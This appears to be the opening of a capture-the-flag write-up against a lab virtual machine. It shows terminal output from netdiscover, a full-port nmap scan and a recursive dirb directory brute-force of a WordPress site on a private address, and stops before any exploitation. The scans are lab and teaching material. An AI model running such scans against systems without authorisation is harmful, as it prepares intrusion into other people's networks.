bottomReconnaissance:

root@kali:~/mrrobt# netdiscover -r 192.168.118.0/24


 Currently scanning: Finished!   |   Screen View: Unique Hosts    

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240     
 _____________________________________________________________________________
   IP  At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.118.1   00:50:56:c0:00:08      1      60  Unknown vendor    
 192.168.118.2   00:50:56:f4:18:88      1      60  Unknown vendor    
 192.168.118.187 00:0c:29:83:a2:de      1      60  Unknown vendor    
 192.168.118.254 00:50:56:fe:e2:bc      1      60  Unknown vendor


Enumeration:
root@kali:~/mrrobt# nmap -p 1-65535 -T 4 -A -v 192.168.118.187

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-20 11:12 MDT
NSE: Loaded 143 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:12
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE: Active NSE Script Threads: 1 (0 waiting)
NSE Timing: About 0.00% done
Completed NSE at 11:12, 0.00s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating ARP Ping Scan at 11:12
Scanning 192.168.118.187 [1 port]
Completed ARP Ping Scan at 11:12, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:12
Completed Parallel DNS resolution of 1 host. at 11:12, 0.06s elapsed
Initiating SYN Stealth Scan at 11:12
Scanning 192.168.118.187 [65535 ports]
Discovered open port 80/tcp on 192.168.118.187
Discovered open port 443/tcp on 192.168.118.187
SYN Stealth Scan Timing: About 23.28% done; ETC: 11:14 (0:01:42 remaining)
SYN Stealth Scan Timing: About 59.43% done; ETC: 11:14 (0:00:42 remaining)
Completed SYN Stealth Scan at 11:13, 88.11s elapsed (65535 total ports)
Initiating Service scan at 11:13
Scanning 2 services on 192.168.118.187
Completed Service scan at 11:13, 12.08s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.118.187
NSE: Script scanning 192.168.118.187.
Initiating NSE at 11:14
Completed NSE at 11:14, 1.80s elapsed
Initiating NSE at 11:14
Completed NSE at 11:14, 0.00s elapsed
Nmap scan report for 192.168.118.187
Host is up (0.00059s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
MAC Address: 00:0C:29:83:A2:DE (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.2
Uptime guess: 0.000 days (since Sat May 20 11:13:56 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 192.168.118.187

NSE: Script Post-scanning.
Initiating NSE at 11:14
Completed NSE at 11:14, 0.00s elapsed
Initiating NSE at 11:14
Completed NSE at 11:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.13 seconds
 Raw packets sent: 131165 (5.773MB) | Rcvd: 85 (3.770KB)


 root@kali:~/mrrobt# dirb http://192.168.118.187

 -----------------
 DIRB v2.22    
 By The Dark Raver
 -----------------

 START_TIME: Sat May 20 11:16:58 2017
 URL_BASE: http://192.168.118.187/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

 -----------------

 GENERATED WORDS: 4612        

 ---- Scanning URL: http://192.168.118.187/ ----
 ==> DIRECTORY: http://192.168.118.187/0/         
 ==> DIRECTORY: http://192.168.118.187/admin/     
 + http://192.168.118.187/atom (CODE:301|SIZE:0)  
 ==> DIRECTORY: http://192.168.118.187/audio/     
 ==> DIRECTORY: http://192.168.118.187/blog/      
 ==> DIRECTORY: http://192.168.118.187/css/       
 + http://192.168.118.187/dashboard (CODE:302|SIZE:0)       
 + http://192.168.118.187/favicon.ico (CODE:200|SIZE:0)     
 ==> DIRECTORY: http://192.168.118.187/feed/      
 ==> DIRECTORY: http://192.168.118.187/image/     
 ==> DIRECTORY: http://192.168.118.187/Image/     
 ==> DIRECTORY: http://192.168.118.187/images/    
 + http://192.168.118.187/index.html (CODE:200|SIZE:1188)   
 + http://192.168.118.187/index.php (CODE:301|SIZE:0)       
 + http://192.168.118.187/intro (CODE:200|SIZE:516314)      
 ==> DIRECTORY: http://192.168.118.187/js/        
 + http://192.168.118.187/license (CODE:200|SIZE:19930)     
 + http://192.168.118.187/login (CODE:302|SIZE:0)
 + http://192.168.118.187/page1 (CODE:301|SIZE:0)
 + http://192.168.118.187/phpmyadmin (CODE:403|SIZE:94)     
 + http://192.168.118.187/rdf (CODE:301|SIZE:0)   
 + http://192.168.118.187/readme (CODE:200|SIZE:7356)       
 + http://192.168.118.187/robots (CODE:200|SIZE:41)         
 + http://192.168.118.187/robots.txt (CODE:200|SIZE:41)     
 + http://192.168.118.187/rss (CODE:301|SIZE:0)   
 + http://192.168.118.187/rss2 (CODE:301|SIZE:0)  
 + http://192.168.118.187/sitemap (CODE:200|SIZE:0)         
 + http://192.168.118.187/sitemap.xml (CODE:200|SIZE:0)     
 ==> DIRECTORY: http://192.168.118.187/video/     
 ==> DIRECTORY: http://192.168.118.187/wp-admin/  
 + http://192.168.118.187/wp-config (CODE:200|SIZE:0)       
 ==> DIRECTORY: http://192.168.118.187/wp-content/
 + http://192.168.118.187/wp-cron (CODE:200|SIZE:0)         
 ==> DIRECTORY: http://192.168.118.187/wp-includes/         
 + http://192.168.118.187/wp-links-opml (CODE:200|SIZE:228)
 + http://192.168.118.187/wp-load (CODE:200|SIZE:0)         
 + http://192.168.118.187/wp-login (CODE:200|SIZE:2689)     
 + http://192.168.118.187/wp-mail (CODE:403|SIZE:3018)      
 + http://192.168.118.187/wp-settings (CODE:500|SIZE:0)     
 + http://192.168.118.187/wp-signup (CODE:302|SIZE:0)       
 + http://192.168.118.187/xmlrpc (CODE:405|SIZE:42)         
 + http://192.168.118.187/xmlrpc.php (CODE:405|SIZE:42)     

 ---- Entering directory: http://192.168.118.187/0/ ----
 + http://192.168.118.187/0/atom (CODE:301|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/0/feed/    
 + http://192.168.118.187/0/index.php (CODE:301|SIZE:0)     
 + http://192.168.118.187/0/rdf (CODE:301|SIZE:0)
 + http://192.168.118.187/0/rss (CODE:301|SIZE:0)
 + http://192.168.118.187/0/rss2 (CODE:301|SIZE:0)

 ---- Entering directory: http://192.168.118.187/admin/ ----
 + http://192.168.118.187/admin/atom (CODE:301|SIZE:0)      
 ==> DIRECTORY: http://192.168.118.187/admin/audio/         
 ==> DIRECTORY: http://192.168.118.187/admin/css/
 ==> DIRECTORY: http://192.168.118.187/admin/feed/
 ==> DIRECTORY: http://192.168.118.187/admin/images/        
 + http://192.168.118.187/admin/index (CODE:200|SIZE:1188)  
 + http://192.168.118.187/admin/index.html (CODE:200|SIZE:1188)       
 + http://192.168.118.187/admin/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/admin/intro (CODE:200|SIZE:516314)
 ==> DIRECTORY: http://192.168.118.187/admin/js/  
 + http://192.168.118.187/admin/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/robot (CODE:200|SIZE:30178875)        
 + http://192.168.118.187/admin/robots (CODE:200|SIZE:43)   
 + http://192.168.118.187/admin/robots.txt (CODE:200|SIZE:43)         
 + http://192.168.118.187/admin/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/admin/rss2 (CODE:301|SIZE:0)      
 ==> DIRECTORY: http://192.168.118.187/admin/video/         

 ---- Entering directory: http://192.168.118.187/audio/ ----
 + http://192.168.118.187/audio/atom (CODE:301|SIZE:0)      
 ==> DIRECTORY: http://192.168.118.187/audio/feed/
 + http://192.168.118.187/audio/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/audio/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/audio/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/audio/rss2 (CODE:301|SIZE:0)      
 + http://192.168.118.187/audio/type (CODE:200|SIZE:4643)   

 ---- Entering directory: http://192.168.118.187/blog/ ----
 + http://192.168.118.187/blog/atom (CODE:301|SIZE:0)       
 ==> DIRECTORY: http://192.168.118.187/blog/feed/
 + http://192.168.118.187/blog/index.php (CODE:301|SIZE:0)  
 + http://192.168.118.187/blog/rdf (CODE:301|SIZE:0)        
 + http://192.168.118.187/blog/rss (CODE:301|SIZE:0)        
 + http://192.168.118.187/blog/rss2 (CODE:301|SIZE:0)       

 ---- Entering directory: http://192.168.118.187/css/ ----
 + http://192.168.118.187/css/atom (CODE:301|SIZE:0)        
 ==> DIRECTORY: http://192.168.118.187/css/feed/  
 + http://192.168.118.187/css/index.php (CODE:301|SIZE:0)   
 + http://192.168.118.187/css/rdf (CODE:301|SIZE:0)         
 + http://192.168.118.187/css/rss (CODE:301|SIZE:0)         
 + http://192.168.118.187/css/rss2 (CODE:301|SIZE:0)        

 ---- Entering directory: http://192.168.118.187/feed/ ----
 ==> DIRECTORY: http://192.168.118.187/feed/atom/
 + http://192.168.118.187/feed/feed (CODE:301|SIZE:0)       
 + http://192.168.118.187/feed/index.php (CODE:301|SIZE:0)  
 ==> DIRECTORY: http://192.168.118.187/feed/rdf/  
 + http://192.168.118.187/feed/rss (CODE:301|SIZE:0)        
 + http://192.168.118.187/feed/rss2 (CODE:301|SIZE:0)       

 ---- Entering directory: http://192.168.118.187/image/ ----
 ==> DIRECTORY: http://192.168.118.187/image/0/   
 ==> DIRECTORY: http://192.168.118.187/image/00/  
 + http://192.168.118.187/image/01 (CODE:200|SIZE:11905)    
 + http://192.168.118.187/image/02 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/03 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/04 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/05 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/06 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/07 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/08 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/09 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/image/1 (CODE:200|SIZE:11904)     
 + http://192.168.118.187/image/10 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/100 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/1000 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1001 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/101 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/102 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/103 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/11 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/12 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/123 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/13 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/14 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/15 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/1990 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1991 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1992 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1993 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1994 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1995 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1996 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1997 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1998 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/1999 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/20 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/200 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/2000 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2001 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2002 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2003 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2004 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2005 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2006 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2007 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2008 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2009 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2010 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2011 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2012 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2013 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/2014 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/21 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/22 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/2257 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/image/23 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/24 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/25 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/3 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/30 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/300 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/32 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/4 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/400 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/401 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/403 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/404 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/42 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/5 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/50 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/500 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/image/51 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/6 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/64 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/7 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/8 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/9 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/image/96 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/image/atom (CODE:301|SIZE:0)      
 + http://192.168.118.187/image/comment-page-1 (CODE:301|SIZE:0)      
 + http://192.168.118.187/image/feed (CODE:301|SIZE:0)      
 + http://192.168.118.187/image/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/image/page1 (CODE:301|SIZE:0)     
 + http://192.168.118.187/image/page2 (CODE:301|SIZE:0)     
 + http://192.168.118.187/image/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/image/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/image/rss2 (CODE:301|SIZE:0)      
 + http://192.168.118.187/image/trackback (CODE:302|SIZE:0)

 ---- Entering directory: http://192.168.118.187/Image/ ----
 ==> DIRECTORY: http://192.168.118.187/Image/0/   
 ==> DIRECTORY: http://192.168.118.187/Image/00/  
 + http://192.168.118.187/Image/01 (CODE:200|SIZE:11905)    
 + http://192.168.118.187/Image/02 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/03 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/04 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/05 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/06 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/07 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/08 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/09 (CODE:200|SIZE:11935)    
 + http://192.168.118.187/Image/1 (CODE:200|SIZE:11904)     
 + http://192.168.118.187/Image/10 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/100 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/1000 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1001 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/101 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/102 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/103 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/11 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/12 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/123 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/13 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/14 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/15 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/1990 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1991 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1992 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1993 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1994 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1995 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1996 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1997 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1998 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/1999 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/20 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/200 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/2000 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2001 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2002 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2003 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2004 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2005 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2006 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2007 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2008 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2009 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2010 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2011 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2012 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2013 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/2014 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/21 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/22 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/2257 (CODE:200|SIZE:11946)  
 + http://192.168.118.187/Image/23 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/24 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/25 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/3 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/30 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/300 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/32 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/4 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/400 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/401 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/403 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/404 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/42 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/5 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/50 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/500 (CODE:200|SIZE:11942)   
 + http://192.168.118.187/Image/51 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/6 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/64 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/7 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/8 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/9 (CODE:200|SIZE:11934)     
 + http://192.168.118.187/Image/96 (CODE:200|SIZE:11938)    
 + http://192.168.118.187/Image/atom (CODE:301|SIZE:0)      
 + http://192.168.118.187/Image/comment-page-1 (CODE:301|SIZE:0)      
 + http://192.168.118.187/Image/feed (CODE:301|SIZE:0)      
 + http://192.168.118.187/Image/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/Image/page1 (CODE:301|SIZE:0)     
 + http://192.168.118.187/Image/page2 (CODE:301|SIZE:0)     
 + http://192.168.118.187/Image/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/Image/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/Image/rss2 (CODE:301|SIZE:0)      
 + http://192.168.118.187/Image/trackback (CODE:302|SIZE:0)

 ---- Entering directory: http://192.168.118.187/images/ ----
 + http://192.168.118.187/images/atom (CODE:301|SIZE:0)     
 ==> DIRECTORY: http://192.168.118.187/images/feed/         
 ==> DIRECTORY: http://192.168.118.187/images/headlines/    
 + http://192.168.118.187/images/index.php (CODE:301|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/images/question/     
 + http://192.168.118.187/images/rdf (CODE:301|SIZE:0)      
 + http://192.168.118.187/images/rss (CODE:301|SIZE:0)      
 + http://192.168.118.187/images/rss2 (CODE:301|SIZE:0)     

 ---- Entering directory: http://192.168.118.187/js/ ----
 + http://192.168.118.187/js/atom (CODE:301|SIZE:0)         
 ==> DIRECTORY: http://192.168.118.187/js/feed/   
 + http://192.168.118.187/js/index.php (CODE:301|SIZE:0)    
 + http://192.168.118.187/js/rdf (CODE:301|SIZE:0)
 + http://192.168.118.187/js/rss (CODE:301|SIZE:0)
 + http://192.168.118.187/js/rss2 (CODE:301|SIZE:0)         
 ==> DIRECTORY: http://192.168.118.187/js/vendor/

 ---- Entering directory: http://192.168.118.187/video/ ----
 + http://192.168.118.187/video/atom (CODE:301|SIZE:0)      
 ==> DIRECTORY: http://192.168.118.187/video/feed/
 + http://192.168.118.187/video/index.php (CODE:301|SIZE:0)
 + http://192.168.118.187/video/prepare (CODE:200|SIZE:7263593)       
 + http://192.168.118.187/video/rdf (CODE:301|SIZE:0)       
 + http://192.168.118.187/video/rss (CODE:301|SIZE:0)       
 + http://192.168.118.187/video/rss2 (CODE:301|SIZE:0)      

 ---- Entering directory: http://192.168.118.187/wp-admin/ ----
 + http://192.168.118.187/wp-admin/about (CODE:302|SIZE:0)  
 + http://192.168.118.187/wp-admin/admin (CODE:302|SIZE:0)  
 + http://192.168.118.187/wp-admin/admin.php (CODE:302|SIZE:0)        
 + http://192.168.118.187/wp-admin/atom (CODE:301|SIZE:0)   
 + http://192.168.118.187/wp-admin/comment (CODE:302|SIZE:0)
 + http://192.168.118.187/wp-admin/credits (CODE:302|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-admin/css/        
 + http://192.168.118.187/wp-admin/customize (CODE:302|SIZE:0)        
 + http://192.168.118.187/wp-admin/edit (CODE:302|SIZE:0)   
 + http://192.168.118.187/wp-admin/export (CODE:302|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-admin/feed/       
 ==> DIRECTORY: http://192.168.118.187/wp-admin/images/     
 + http://192.168.118.187/wp-admin/import (CODE:302|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-admin/includes/   
 + http://192.168.118.187/wp-admin/index (CODE:302|SIZE:0)  
 + http://192.168.118.187/wp-admin/index.php (CODE:302|SIZE:0)        
 ==> DIRECTORY: http://192.168.118.187/wp-admin/js/         
 + http://192.168.118.187/wp-admin/link (CODE:302|SIZE:0)   
 ==> DIRECTORY: http://192.168.118.187/wp-admin/maint/      
 + http://192.168.118.187/wp-admin/media (CODE:302|SIZE:0)  
 + http://192.168.118.187/wp-admin/menu (CODE:500|SIZE:0)   
 + http://192.168.118.187/wp-admin/moderation (CODE:302|SIZE:0)       
 ==> DIRECTORY: http://192.168.118.187/wp-admin/network/    
 + http://192.168.118.187/wp-admin/options (CODE:302|SIZE:0)
 + http://192.168.118.187/wp-admin/plugins (CODE:302|SIZE:0)
 + http://192.168.118.187/wp-admin/post (CODE:302|SIZE:0)   
 + http://192.168.118.187/wp-admin/profile (CODE:302|SIZE:0)
 + http://192.168.118.187/wp-admin/rdf (CODE:301|SIZE:0)    
 + http://192.168.118.187/wp-admin/rss (CODE:301|SIZE:0)    
 + http://192.168.118.187/wp-admin/rss2 (CODE:301|SIZE:0)   
 + http://192.168.118.187/wp-admin/themes (CODE:302|SIZE:0)
 + http://192.168.118.187/wp-admin/tools (CODE:302|SIZE:0)  
 + http://192.168.118.187/wp-admin/update (CODE:302|SIZE:0)
 + http://192.168.118.187/wp-admin/upgrade (CODE:200|SIZE:1241)       
 + http://192.168.118.187/wp-admin/upload (CODE:302|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-admin/user/       
 + http://192.168.118.187/wp-admin/users (CODE:302|SIZE:0)  
 + http://192.168.118.187/wp-admin/widgets (CODE:302|SIZE:0)

 ---- Entering directory: http://192.168.118.187/wp-content/ ----
 + http://192.168.118.187/wp-content/atom (CODE:301|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-content/feed/     
 + http://192.168.118.187/wp-content/index (CODE:200|SIZE:0)
 + http://192.168.118.187/wp-content/index.php (CODE:200|SIZE:0)      
 ==> DIRECTORY: http://192.168.118.187/wp-content/languages/
 ==> DIRECTORY: http://192.168.118.187/wp-content/plugins/  
 + http://192.168.118.187/wp-content/rdf (CODE:301|SIZE:0)  
 + http://192.168.118.187/wp-content/rss (CODE:301|SIZE:0)  
 + http://192.168.118.187/wp-content/rss2 (CODE:301|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-content/themes/   
 ==> DIRECTORY: http://192.168.118.187/wp-content/upgrade/  
 ==> DIRECTORY: http://192.168.118.187/wp-content/uploads/  

 ---- Entering directory: http://192.168.118.187/wp-includes/ ----
 + http://192.168.118.187/wp-includes/atom (CODE:301|SIZE:0)
 + http://192.168.118.187/wp-includes/bookmark (CODE:200|SIZE:0)      
 + http://192.168.118.187/wp-includes/cache (CODE:200|SIZE:0)         
 + http://192.168.118.187/wp-includes/category (CODE:200|SIZE:0)      
 ==> DIRECTORY: http://192.168.118.187/wp-includes/certificates/      
 + http://192.168.118.187/wp-includes/comment (CODE:200|SIZE:0)       
 + http://192.168.118.187/wp-includes/compat (CODE:200|SIZE:0)        
 + http://192.168.118.187/wp-includes/cron (CODE:200|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-includes/css/     
 + http://192.168.118.187/wp-includes/date (CODE:200|SIZE:0)
 + http://192.168.118.187/wp-includes/feed (CODE:200|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-includes/fonts/   
 + http://192.168.118.187/wp-includes/formatting (CODE:200|SIZE:0)    
 + http://192.168.118.187/wp-includes/functions (CODE:500|SIZE:0)     
 + http://192.168.118.187/wp-includes/http (CODE:200|SIZE:0)
 ==> DIRECTORY: http://192.168.118.187/wp-includes/images/  
 + http://192.168.118.187/wp-includes/index.php (CODE:301|SIZE:0)     
 ==> DIRECTORY: http://192.168.118.187/wp-includes/js/      
 + http://192.168.118.187/wp-includes/load (CODE:200|SIZE:0)
 + http://192.168.118.187/wp-includes/locale (CODE:200|SIZE:0)        
 + http://192.168.118.187/wp-includes/media (CODE:500|SIZE:0)         
 + http://192.168.118.187/wp-includes/meta (CODE:200|SIZE:0)
 + http://192.168.118.187/wp-includes/option (CODE:200|SIZE:0)        
 + http://192.168.118.187/wp-includes/plugin (CODE:200|SIZE:0)        
 + http://192.168.118.187/wp-includes/post (CODE:200|SIZE:0)
 + http://192.168.118.187/wp-includes/query (CODE:200|SIZE:0)         
 + http://192.168.118.187/wp-includes/rdf (CODE:301|SIZE:0)
 + http://192.168.118.187/wp-includes/registration (CODE:500|SIZE:0)  
 + http://192.168.118.187/wp-includes/rss (CODE:500|SIZE:0)
 + http://192.168.118.187/wp-includes/rss2 (CODE:301|SIZE:0)
